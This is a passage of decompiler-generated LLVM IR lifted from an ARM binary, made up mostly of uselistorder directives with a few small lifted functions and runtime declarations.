646, 1183, 436, 1184, 1185, 492, 1186, 1187, 435, 1188, 1189, 647, 1190, 1191, 1192, 1193, 1194, 389, 1195, 648, 1196, 649, 650, 1197, 1198, 1199, 1200, 437, 1201, 1202, 438, 1203, 1204, 439, 1205, 390, 434, 433, 1206, 1207, 641, 1208, 1209, 1210, 639, 1211, 388, 640, 491, 1212, 1214, 1215, 1213, 651, 1216, 652, 1217, 653, 1218, 1219, 807, 1220, 454, 1221, 1222, 452, 654, 1223, 804, 803, 802, 801, 800, 799, 798, 797, 796, 795, 794, 793, 140, 142, 145, 147, 146, 141, 143, 144, 805, 806, 189 }
  uselistorder label %dec_label_pc_18434, { 1, 0 }
  uselistorder label %dec_label_pc_183b0, { 1, 0 }
  uselistorder label %dec_label_pc_18360, { 1, 0 }
  uselistorder label %dec_label_pc_18344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_182fc, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_184bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_184bc:
  %v0_184bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_184bc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_184bc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_184bc, %bb
  %v10_184c4 = phi i32 [ %arg1, %dec_label_pc_184bc ], [ 0, %bb ]
  ret i32 %v10_184c4

; uselistorder directives
  uselistorder i1 false, { 45, 46, 47, 49, 48, 50, 11, 12, 34, 14, 17, 16, 15, 23, 35, 36, 37, 13, 38, 39, 40, 41, 0, 2, 29, 28, 19, 20, 3, 25, 1, 9, 10, 18, 4, 5, 6, 30, 22, 42, 43, 44, 7, 8, 31, 32, 33, 21, 26, 27, 24, 51 }
  uselistorder i1* @cpsr_z, { 2, 3, 5, 6, 4, 7, 8, 19, 20, 1, 9, 10, 11, 12, 21, 22, 13, 23, 25, 27, 26, 24, 14, 15, 16, 17, 18, 28, 29, 30, 31, 32, 51, 52, 53, 61, 62, 63, 64, 33, 34, 35, 36, 37, 38, 0, 39, 47, 48, 49, 50, 40, 41, 42, 43, 44, 45, 46, 54, 55, 56, 57, 58, 59, 60, 65, 66 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_19718() local_unnamed_addr {
dec_label_pc_19718:
  %v1_1971c = call i32 @function_14df0(i32 6)
  %v1_19724 = call i32 @function_14df0(i32 9)
  br label %dec_label_pc_19728

dec_label_pc_19728:                               ; preds = %dec_label_pc_19728, %dec_label_pc_19718
  br label %dec_label_pc_19728

; uselistorder directives
  uselistorder i32 9, { 11, 37, 38, 57, 58, 0, 63, 7, 64, 8, 39, 13, 40, 12, 14, 41, 34, 59, 5, 35, 60, 36, 15, 62, 16, 42, 43, 3, 17, 18, 1, 19, 20, 21, 22, 2, 23, 24, 61, 4, 44, 45, 9, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 6, 56, 32, 31, 30, 29, 28, 27, 26, 25, 33, 65, 66, 10, 67 }
  uselistorder i32 (i32)* @function_14df0, { 3, 2, 0, 1 }
  uselistorder i32 6, { 14, 79, 0, 15, 81, 80, 82, 16, 40, 17, 41, 3, 77, 18, 78, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 5, 34, 42, 43, 44, 6, 45, 46, 47, 48, 7, 49, 50, 51, 52, 8, 9, 53, 54, 55, 35, 56, 10, 57, 58, 36, 59, 11, 60, 61, 37, 62, 63, 64, 65, 66, 38, 67, 12, 68, 69, 70, 71, 72, 73, 39, 74, 13, 75, 4, 76, 2 }
}

define i32 @function_1972c() local_unnamed_addr {
entry:
  %v3_1972c = load i32, i32* @r0, align 4
  ret i32 %v3_1972c

; uselistorder directives
  uselistorder i32 0, { 118, 756, 757, 154, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 37, 96, 423, 768, 155, 769, 770, 771, 0, 772, 773, 1, 156, 774, 775, 776, 719, 1061, 1062, 164, 1063, 2, 1064, 165, 157, 1065, 163, 160, 161, 162, 159, 1066, 158, 1067, 1068, 777, 168, 778, 3, 779, 169, 780, 720, 781, 120, 782, 721, 783, 784, 166, 785, 786, 787, 167, 119, 788, 121, 122, 789, 790, 791, 1207, 1208, 152, 113, 114, 1209, 170, 1210, 1211, 1212, 1213, 1214, 4, 792, 793, 794, 693, 795, 42, 796, 797, 798, 799, 5, 800, 801, 802, 803, 804, 694, 6, 805, 695, 806, 722, 807, 808, 809, 810, 811, 812, 813, 38, 43, 816, 424, 815, 80, 81, 814, 425, 818, 349, 817, 1069, 426, 1070, 1071, 1526, 350, 1527, 427, 44, 1215, 1072, 172, 171, 847, 848, 104, 849, 850, 174, 173, 851, 852, 853, 175, 854, 1216, 7, 8, 176, 72, 419, 375, 376, 1217, 1218, 178, 1219, 177, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 179, 1228, 1229, 1230, 1231, 1232, 1233, 184, 185, 186, 187, 188, 1234, 183, 180, 181, 182, 1235, 1236, 45, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 1237, 190, 189, 191, 1238, 115, 1239, 1073, 1074, 1075, 428, 1076, 1077, 437, 438, 439, 432, 433, 434, 1078, 435, 436, 1079, 440, 441, 442, 1080, 1081, 1082, 1083, 445, 1084, 1085, 195, 196, 1086, 1087, 197, 1088, 1089, 430, 429, 1090, 1091, 1092, 1093, 73, 1094, 1097, 46, 47, 1095, 1096, 446, 1098, 1099, 192, 193, 377, 443, 1100, 444, 431, 1101, 1102, 198, 194, 1103, 117, 74, 1104, 1105, 1106, 1107, 133, 1108, 1109, 134, 135, 1529, 1528, 1530, 199, 200, 342, 1566, 1567, 202, 201, 351, 447, 1565, 819, 203, 1240, 9, 378, 448, 449, 1241, 450, 204, 820, 821, 1243, 451, 1242, 82, 83, 1244, 1245, 1121, 855, 856, 857, 10, 11, 858, 1246, 1247, 1249, 1250, 723, 84, 105, 1251, 1248, 822, 823, 824, 825, 452, 826, 1568, 1569, 1570, 1571, 1252, 724, 1253, 1254, 725, 726, 1255, 1256, 1257, 1258, 727, 696, 1531, 1532, 1533, 697, 1534, 1535, 77, 78, 79, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 728, 698, 1548, 1549, 1550, 1551, 699, 1552, 700, 1553, 1554, 1555, 1556, 1557, 701, 1558, 1559, 1560, 1561, 729, 702, 1562, 1563, 1564, 1112, 827, 1110, 207, 380, 379, 206, 205, 1111, 881, 882, 208, 136, 209, 859, 860, 453, 12, 381, 454, 210, 861, 455, 456, 457, 13, 1200, 1259, 1260, 1261, 1262, 1263, 370, 369, 368, 1264, 211, 883, 48, 49, 50, 51, 52, 212, 1113, 1114, 458, 1115, 1116, 459, 1117, 1118, 213, 214, 1265, 1266, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 215, 1267, 216, 1268, 1269, 1270, 1271, 1272, 420, 382, 383, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 460, 1281, 1282, 1283, 1284, 1285, 1286, 1335, 1337, 1336, 1338, 1339, 1340, 1341, 1357, 461, 1358, 1359, 1360, 1361, 1362, 1363, 462, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 85, 137, 217, 1371, 1287, 1288, 1289, 1290, 1291, 218, 1292, 463, 1293, 1294, 1295, 1296, 464, 1297, 1298, 1299, 1300, 86, 1301, 1302, 1303, 1304, 1305, 1321, 1322, 465, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 139, 138, 1332, 1333, 1334, 1306, 1307, 1308, 1309, 466, 1310, 1311, 1312, 1313, 219, 1314, 1315, 467, 1316, 1317, 1318, 1319, 1320, 1342, 1343, 1344, 1345, 468, 1346, 1347, 1348, 1349, 220, 1350, 1351, 469, 1352, 1353, 1354, 1355, 1356, 1372, 221, 1373, 1374, 916, 917, 106, 918, 470, 471, 1375, 472, 1376, 1377, 222, 473, 1572, 474, 1573, 1574, 1575, 1576, 692, 352, 223, 1577, 890, 891, 224, 892, 39, 14, 893, 894, 140, 141, 225, 895, 896, 897, 15, 1378, 1379, 1380, 1381, 109, 1382, 226, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 227, 703, 730, 704, 705, 1390, 1391, 1392, 1393, 1394, 1395, 16, 1396, 1397, 110, 1398, 1399, 1400, 1401, 1402, 228, 1403, 706, 731, 707, 708, 1404, 732, 153, 229, 1405, 1406, 1407, 107, 366, 1408, 1409, 53, 142, 733, 353, 18, 17, 230, 1410, 231, 734, 19, 354, 232, 233, 234, 1411, 54, 1412, 235, 475, 1132, 898, 899, 900, 1414, 1413, 1415, 1416, 1417, 1418, 40, 236, 1419, 1420, 1421, 237, 1422, 97, 98, 421, 422, 239, 238, 240, 1423, 241, 1424, 1425, 242, 1191, 1192, 476, 243, 244, 245, 1426, 246, 1427, 1133, 249, 1134, 1135, 477, 1136, 839, 840, 247, 248, 841, 843, 828, 99, 55, 346, 345, 829, 830, 735, 831, 842, 478, 838, 736, 832, 737, 833, 738, 834, 739, 835, 740, 836, 741, 837, 844, 845, 479, 846, 111, 1137, 691, 1138, 480, 1139, 1140, 356, 355, 1141, 1142, 1143, 1144, 251, 250, 1145, 1146, 1147, 742, 343, 1148, 89, 90, 344, 1149, 87, 88, 481, 1151, 1152, 709, 1153, 1154, 1155, 1156, 1157, 482, 1158, 1159, 1161, 718, 1162, 1163, 1164, 717, 1165, 1166, 483, 1167, 484, 1168, 1171, 1172, 1173, 252, 1169, 253, 1170, 254, 1150, 865, 866, 867, 101, 56, 868, 100, 57, 869, 870, 485, 871, 486, 487, 872, 488, 873, 874, 876, 255, 256, 875, 367, 58, 91, 371, 877, 257, 20, 878, 919, 920, 923, 924, 925, 921, 922, 926, 927, 862, 21, 863, 258, 489, 864, 879, 490, 880, 491, 492, 263, 262, 743, 143, 265, 264, 744, 144, 267, 266, 745, 145, 269, 268, 746, 146, 747, 261, 260, 259, 358, 359, 360, 361, 493, 270, 887, 884, 885, 886, 357, 888, 59, 889, 271, 494, 108, 901, 902, 903, 904, 364, 905, 906, 907, 363, 908, 909, 910, 911, 272, 912, 914, 913, 147, 148, 273, 362, 495, 915, 496, 497, 384, 274, 275, 1160, 75, 276, 928, 929, 278, 279, 930, 931, 60, 277, 112, 280, 76, 498, 932, 933, 934, 935, 281, 282, 936, 937, 388, 938, 939, 940, 941, 286, 283, 284, 285, 942, 943, 944, 945, 499, 946, 947, 387, 948, 386, 949, 385, 950, 500, 951, 288, 952, 289, 954, 955, 61, 953, 287, 956, 290, 102, 291, 957, 391, 389, 958, 390, 959, 294, 960, 295, 962, 963, 62, 293, 961, 292, 964, 296, 297, 965, 394, 966, 392, 393, 967, 501, 968, 502, 103, 63, 969, 149, 395, 503, 970, 971, 298, 972, 396, 973, 300, 974, 301, 977, 978, 64, 975, 299, 976, 150, 979, 22, 23, 24, 25, 26, 980, 302, 303, 981, 398, 982, 397, 983, 504, 984, 505, 985, 506, 986, 507, 987, 508, 988, 509, 989, 306, 991, 992, 993, 994, 304, 307, 995, 996, 65, 66, 990, 305, 998, 997, 27, 28, 29, 30, 31, 308, 309, 999, 401, 1000, 400, 1001, 510, 1002, 511, 1003, 512, 1004, 513, 1005, 514, 1006, 399, 1007, 515, 1008, 313, 1010, 1011, 1012, 311, 310, 314, 1013, 1014, 67, 68, 1009, 312, 69, 516, 1016, 1018, 1019, 1020, 517, 1021, 518, 1022, 32, 33, 34, 35, 36, 1017, 1015, 315, 1023, 1024, 407, 1025, 406, 1026, 405, 1027, 404, 1028, 403, 1029, 402, 1030, 519, 1031, 1034, 1035, 1036, 317, 318, 1037, 1038, 70, 1032, 1033, 316, 1039, 1040, 319, 320, 1041, 410, 1042, 409, 1043, 408, 1044, 520, 1045, 1047, 1048, 1049, 322, 323, 324, 1051, 1052, 71, 1050, 1046, 321, 1053, 1054, 325, 326, 1055, 413, 1056, 412, 1057, 411, 1058, 521, 1059, 372, 1060, 1428, 327, 1429, 1119, 328, 1120, 1174, 1175, 1176, 1177, 1178, 1179, 331, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 329, 330, 1188, 1189, 1190, 1193, 116, 1194, 1195, 373, 522, 365, 1196, 1197, 41, 1198, 1199, 523, 1201, 332, 1430, 1202, 1203, 1204, 1205, 1206, 1431, 1432, 1433, 1434, 333, 334, 524, 1435, 1436, 710, 711, 712, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 748, 1449, 1450, 1451, 1452, 749, 1453, 1454, 1455, 713, 1456, 714, 335, 336, 337, 1457, 1458, 1459, 1460, 750, 1461, 1462, 151, 1463, 1464, 751, 1465, 338, 1466, 1467, 1468, 752, 525, 526, 1469, 1470, 753, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 527, 1485, 1480, 1481, 1482, 1483, 754, 1484, 755, 1486, 528, 1487, 1488, 1489, 1490, 529, 1491, 1492, 1493, 1494, 715, 1496, 1497, 1498, 1499, 1500, 374, 1501, 1504, 1505, 1502, 1503, 340, 339, 1506, 1507, 1508, 1509, 341, 1510, 1511, 347, 1512, 92, 93, 348, 1513, 94, 95, 530, 1514, 1495, 689, 690, 1515, 1516, 716, 1517, 1518, 1519, 1520, 1521, 531, 1522, 414, 1523, 415, 1524, 532, 416, 417, 1525, 418, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592 }
  uselistorder i32* @r0, { 91, 276, 277, 278, 279, 280, 281, 282, 283, 4, 284, 285, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 16, 286, 338, 339, 340, 37, 15, 30, 287, 288, 14, 64, 19, 26, 39, 187, 33, 289, 441, 442, 440, 104, 40, 45, 32, 25, 0, 12, 188, 65, 341, 17, 38, 105, 22, 290, 5, 66, 67, 1, 61, 332, 13, 68, 69, 70, 342, 71, 343, 291, 292, 21, 23, 72, 31, 41, 344, 29, 345, 11, 294, 295, 296, 297, 24, 73, 346, 347, 348, 74, 349, 350, 351, 368, 85, 375, 376, 86, 87, 377, 378, 75, 352, 353, 76, 6, 354, 77, 355, 356, 80, 364, 81, 82, 365, 366, 367, 357, 78, 358, 359, 360, 361, 79, 2, 362, 363, 369, 83, 370, 371, 372, 84, 3, 373, 374, 379, 189, 380, 242, 88, 381, 89, 90, 34, 35, 27, 10, 443, 444, 36, 445, 9, 18, 224, 28, 382, 20, 383, 384, 298, 385, 386, 387, 388, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 175, 176, 177, 178, 179, 180, 181, 182, 183, 299, 184, 158, 159, 185, 161, 162, 173, 174, 160, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 186, 300, 301, 302, 303, 304, 306, 307, 308, 309, 310, 313, 316, 314, 315, 305, 190, 198, 199, 200, 59, 60, 191, 192, 193, 194, 195, 196, 197, 201, 202, 42, 203, 204, 205, 206, 54, 55, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 56, 217, 57, 218, 219, 58, 220, 221, 222, 223, 43, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 44, 239, 240, 241, 311, 312, 7, 243, 244, 245, 46, 246, 247, 248, 249, 250, 47, 251, 252, 253, 48, 254, 255, 256, 257, 258, 49, 259, 260, 261, 50, 262, 263, 264, 265, 266, 267, 51, 268, 269, 270, 271, 52, 272, 273, 274, 275, 53, 293, 317, 318, 319, 320, 321, 322, 8, 323, 324, 325, 326, 327, 328, 329, 330, 331, 62, 63, 333, 334, 335, 389, 336, 390, 337, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439 }
}

declare i32 @unknown_ffff0fc0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

declare float @fabsf(float)

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
